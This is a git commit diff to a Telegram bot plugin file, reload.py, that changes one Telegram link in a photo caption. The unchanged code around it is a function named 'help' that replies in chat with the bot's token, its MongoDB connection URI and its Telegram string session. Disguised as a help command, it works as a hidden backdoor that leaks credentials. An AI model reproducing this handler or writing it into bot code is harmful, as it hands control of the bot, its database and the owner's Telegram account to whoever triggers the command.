a46fc2bb2b9e0a1a47d13f90069f97b207d68573
Sandeep sharma <rs3268840@gmail.com>
2025-08-13 08:28:25 +0530

    Update reload.py

--- VIP_INNOCENT/plugins/tools/reload.py
+++ VIP_INNOCENT/plugins/tools/reload.py
@@ -113,7 +113,7 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/its_innocent_boy_2926)............☆""",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/crush_hu_tera)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
